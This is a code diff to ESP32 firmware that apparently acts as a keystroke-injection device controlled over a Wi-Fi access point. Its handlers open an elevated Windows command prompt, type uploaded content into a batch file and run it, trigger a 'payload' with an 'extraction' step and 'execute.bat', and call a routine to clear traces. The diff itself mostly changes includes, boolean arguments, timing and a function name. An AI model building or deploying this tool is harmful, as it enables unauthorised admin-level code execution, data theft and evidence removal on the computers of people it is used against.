@@ -1,3 +1,11 @@
+#include <Arduino.h>
+#include <WiFi.h>
+#include <SD.h>
+#include <FS.h>
+#include "web_content.h"
+#include "exescript.h"
+#include "storage/storage_wrapper.h"
+
 #include "wifi_server.h"
 
 // Change the ssid and password to desired value
@@ -144,14 +152,14 @@ void handleFileRequest(const String &filePath)
 void handleExecuteFileRequest()
 {
     open_elevated_cmd();
-    write("CD /d C:/Windows/Temp", 10, 1);
-    write("mkdir temp", 10, 1);
-    write("cd temp", 10, 1);
-    write("rem/ > temp.bat", 10, 1);
-    write("notepad temp.bat", 10, 1);
+    write("CD /d C:/Windows/Temp", 10, true);
+    write("mkdir temp", 10, true);
+    write("cd temp", 10, true);
+    write("rem/ > temp.bat", 10, true);
+    write("notepad temp.bat", 10, true);
     Keyboard.releaseAll();
     delay(2000);
-    write_task(fileContent.c_str(), 20, 0);
+    write_task(fileContent.c_str(), 20, false);
     delay(1000);
     Keyboard.press(KEY_LEFT_CTRL);
     Keyboard.write('s'); // save the file
@@ -165,8 +173,8 @@ void handleExecuteFileRequest()
     delay(1000);
     Keyboard.write(KEY_RETURN);
     delay(1000);
-    write("cls", 10, 1);
-    write("temp.bat", 5, 1);
+    write("cls", 10, true);
+    write("temp.bat", 5, true);
 }
 
 // Restart ESP32
@@ -201,13 +209,12 @@ void handlePayloadRequest()
     snprintf(buffer, sizeof(buffer), redirectToRoot, cssStyles);
     // Go back to home page after completion of extraction
     server.send(200, "text/html", buffer);
-    delay(4000);
-    payload();
-    check_delay = true;
     delay(1000);
+    payload();
     write("cls", 10, 1);
     write("execute.bat", 5, 1);
-    delay(3000);
+    delay(2000);
+    check_delay = true;
     handleMountStorage();
 }
 
@@ -215,7 +222,6 @@ void handleClearTraceRequest()
 {
     server.sendHeader("Location", "/", true);
     server.send(302, "text/plain", "");
-    open_elevated_cmd();
     clear_trace();
 }
 
@@ -228,7 +234,7 @@ void handleRootRequest()
 }
 
 // Start wifiAP and web server at 192.168.4.1
-void setupWiFiServer()
+void setup_WiFi()
 {
     WiFi.softAP(ssid, password);
     delay(100);
